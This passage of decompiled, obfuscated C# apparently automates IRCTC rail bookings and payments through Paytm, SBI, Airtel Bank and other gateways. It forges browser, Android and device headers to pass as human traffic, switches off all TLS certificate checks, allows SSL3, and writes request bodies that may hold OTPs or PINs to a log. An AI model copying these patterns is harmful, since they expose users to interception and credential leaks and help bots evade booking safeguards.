                    if (string_86.Contains("https://checkout.razorpay.com/integration/irctc"))
                    {
                        httpWebRequest.AllowAutoRedirect = true;
                    }
                    if (string_86.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("requestId", String_0);
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if (string_86.Contains("merchant.onlinesbi.sbi"))
                    {
                        httpWebRequest.CachePolicy = cachePolicy;
                        httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";//"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    if (string_86.Contains("ecomVerifyOtp.action"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (string_86.Contains("ecomSendOtp.action") || string_86.Contains("ecomDoTxn.action"))
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                    }
                    if (string_86.Contains("www.airtel.in/bank/api/v1/auth/login/mpin"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                        httpWebRequest.Headers.Add("channel", "WEB");
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num5 = Information.UBound(array);
                        for (int i = 0; i <= num5; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag2)
                    {
                        //httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                        using (Stream stream = httpWebRequest.GetRequestStream())
                        {
                            stream.Write(bytes, 0, bytes.Length);
                        }
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num4 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text2);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag3 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag3)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool _Request_Indus(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num4 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy cachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    //if (bool_63 && cookieContainer_2 == null)
                    //{
                    //    cookieContainer_2 = new CookieContainer();
                    //}
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag2;
                    if (flag2 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                    httpWebRequest.Headers.Add("Origin", "https://indusirctc.payu.in");
                    if (string_86.Contains(".paytm.in"))
                    {
                        ServicePointManager.Expect100Continue = false;
                        if (bool_13)
                        {
                            bool_13 = false;
                            if (string_86.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                            {
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                            }
                            else if (bool_14)
                            {
                                bool_14 = false;
                                httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                                httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                                httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                                httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                                httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                                httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            }
                            else if (!string_86.Contains("https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2"))
                            {
                                httpWebRequest.ContentType = "application/json";
                                httpWebRequest.Accept = "*/*";
                            }
                            httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                        }
                        else
                        {
                            httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                            httpWebRequest.Headers.Add("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                            httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        }
                    }
                    if (string_86.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_27)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_51)
                    {
                        bool_51 = false;
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    else if (string_86.ToLower().Contains("irctc.co.in") && !bool_21)
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_21)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        httpWebRequest.Headers.Add("faces-request", "partial/ajax");
                        if (webProxy_5 != null)
                        {
                            httpWebRequest.Headers.Add("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Add("Pragma", "no-cache");
                        }
                        bool_21 = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if ((string_86.Contains("fss.co.in") || string_86.Contains("fssnet.co.in")) && !bool_28)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (string_86.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (string_86.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + string_88;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Add("Cookie2", "$Version=" + 1);
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num4 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (bool_29)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_36)
                    {
                        httpWebRequest.ContentType = "application/json";
                        bool_36 = false;
                        if (bool_37)
                        {
                            bool_37 = false;
                            httpWebRequest.Headers.Add("browserName", "Chrome");
                            httpWebRequest.Headers.Add("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Add("assignedClientId", "null");
                            httpWebRequest.Headers.Add("osVersion", "Windows 7");
                            httpWebRequest.Headers.Add("clientId", "Web");
                            httpWebRequest.Headers.Add("deviceId", "null");
                            httpWebRequest.Headers.Add("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Add("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Add("appVersion", "null");
                        }
                        if (string_86.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_38)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (string_86.Contains("https://checkout.razorpay.com/integration/irctc"))
                    {
                        httpWebRequest.AllowAutoRedirect = true;
                    }
                    if (string_86.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("requestId", String_0);
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if (string_86.Contains("merchant.onlinesbi.sbi"))
                    {
                        httpWebRequest.CachePolicy = cachePolicy;
                        httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    if (string_86.Contains("ecomVerifyOtp.action"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (string_86.Contains("ecomSendOtp.action") || string_86.Contains("ecomDoTxn.action"))
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                    }
                    if (string_86.Contains("www.airtel.in/bank/api/v1/auth/login/mpin"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                        httpWebRequest.Headers.Add("channel", "WEB");
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num5 = Information.UBound(array);
                        for (int i = 0; i <= num5; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag2)
                    {
                        //httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                        using (Stream stream = httpWebRequest.GetRequestStream())
                        {
                            stream.Write(bytes, 0, bytes.Length);
                        }
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num4 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text2);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag3 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag3)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool _Request_otopay(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num4 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy cachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag2;
                    if (flag2 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary"+ randomvalueb;
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                    if (string_86.Contains(".paytm.in"))
                    {
                        ServicePointManager.Expect100Continue = false;
                        if (bool_13)
                        {
                            bool_13 = false;
                            if (string_86.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                            {
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + randomvalueb;
                            }
                            else if (bool_14)
                            {
                                bool_14 = false;
                                httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                                httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                                httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + randomvalueb;
                                httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                                httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                                httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            }
                            else if (!string_86.Contains("https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2"))
                            {
                                httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + randomvalueb;
                                httpWebRequest.Accept = "*/*";
                            }
                            httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                        }
                        else
                        {
                            httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                            httpWebRequest.Headers.Add("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                            httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        }
                    }
                    if (string_86.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_27)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_51)
                    {
                        bool_51 = false;
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    else if (string_86.ToLower().Contains("irctc.co.in") && !bool_21)
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_21)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        httpWebRequest.Headers.Add("faces-request", "partial/ajax");
